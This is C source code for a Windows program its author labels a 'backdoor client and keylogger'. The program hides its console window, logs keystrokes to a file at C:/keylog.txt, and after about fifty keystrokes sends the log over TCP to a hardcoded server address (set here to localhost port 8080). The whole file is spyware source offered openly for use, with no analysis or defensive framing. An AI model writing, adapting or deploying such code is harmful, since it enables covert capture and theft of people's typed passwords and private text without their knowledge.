/*
 * Title : ANA_Client
 * Author : Speculo
 * Description : Backdoor client and keylogger. Please, be able to implement this C program into a windows host only.
 * Github : *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
#endif

#define PATH "C:/keylog.txt"

int connectToServer(const char *IP_ENDPOINT, long SET_PORT);
void keyLogger();
int sendFile(const char *filename, const char *IP_ENDPOINT, long SET_PORT);

int main() {
    if (connectToServer("127.0.0.1", 8080)) {
        keyLogger();
    }

    return 0;
}

int connectToServer(const char *IP_ENDPOINT, long SET_PORT) {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup function failed with error: %d\n", iResult);
        return 0;
    }

    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 0;
    }

    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(IP_ENDPOINT);
    clientService.sin_port = htons(SET_PORT);

    iResult = connect(ConnectSocket, (struct sockaddr *) &clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        printf("connect function failed with error: %ld\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 0;
    }

    printf("Connected to server.\n");

    closesocket(ConnectSocket);
    WSACleanup();
    return 1;
}

void keyLogger() {
    int bindIndex = 0;
    char getChar;
    FILE *file;

    time_t t;
    t = time(NULL);

    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    file = fopen(PATH, "a+");
    if (file != NULL) {
        fprintf(file, "%s", ctime(&t));
        fclose(file);
    }

    while (1) {
        Sleep(20);
        if (kbhit()) {
            bindIndex++;
            getChar = getch();

            file = fopen(PATH, "a+");
            if (file != NULL) {
                fprintf(file, "%c", getChar);
                fclose(file);
            }
        }

        if (bindIndex > 50) {
            sendFile(PATH, "127.0.0.1", 8080);  // Envoyer le fichier au serveur
            break;
        }
    }
}

int sendFile(const char *filename, const char *IP_ENDPOINT, long SET_PORT) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        printf("Could not open file: %s\n", filename);
        return 0;
    }

    WSADATA wsaData;
    SOCKET ConnectSocket;
    struct sockaddr_in server;
    char buffer[1024];
    int bytesRead, iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        fclose(file);
        return 0;
    }

    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        fclose(file);
        return 0;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(IP_ENDPOINT);
    server.sin_port = htons(SET_PORT);

    iResult = connect(ConnectSocket, (struct sockaddr *)&server, sizeof(server));
    if (iResult == SOCKET_ERROR) {
        printf("Connection failed with error: %ld\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        fclose(file);
        return 0;
    }

    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        iResult = send(ConnectSocket, buffer, bytesRead, 0);
        if (iResult == SOCKET_ERROR) {
            printf("Send failed with error: %ld\n", WSAGetLastError());
            closesocket(ConnectSocket);
            WSACleanup();
            fclose(file);
            return 0;
        }
    }

    printf("File sent successfully.\n");

    fclose(file);
    closesocket(ConnectSocket);
    WSACleanup();
    return 1;
}
